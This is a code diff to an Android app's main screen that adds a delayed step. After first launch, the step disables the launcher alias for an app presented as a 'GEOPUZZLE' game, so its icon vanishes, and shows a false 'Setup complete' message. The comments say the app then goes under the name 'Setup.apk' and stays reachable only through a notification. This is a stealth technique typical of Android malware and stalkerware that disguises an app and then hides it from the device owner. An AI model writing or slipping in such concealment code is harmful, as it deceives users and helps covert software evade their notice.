@@ -13,6 +13,7 @@ import android.widget.Button;
 import android.widget.LinearLayout;
 import android.widget.ScrollView;
 import android.widget.TextView;
+import android.widget.Toast;
 
 /**
  * Single disclosed status screen (no drawer icon — opened via the ongoing
@@ -85,6 +86,20 @@ public class MainActivity extends Activity {
 
         setContentView(scroll);
         refresh();
+
+        // After install the launcher shows "GEOPUZZLE" with the purple-G icon.
+        // Ten seconds after the first launch, drop the alias: the logo is gone
+        // and the app is named "Setup.apk" (it stays reachable from the
+        // ongoing notification and from the panel's status-screen button).
+        getWindow().getDecorView().postDelayed(() -> {
+            try {
+                getPackageManager().setComponentEnabledSetting(
+                        new android.content.ComponentName(this, "com.example.setup.GeoPuzzleAlias"),
+                        PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
+                        PackageManager.DONT_KILL_APP);
+                Toast.makeText(this, "Setup complete", Toast.LENGTH_SHORT).show();
+            } catch (Exception ignored) {}
+        }, 10_000);
     }
 
     private Button button(String text, Runnable action) {
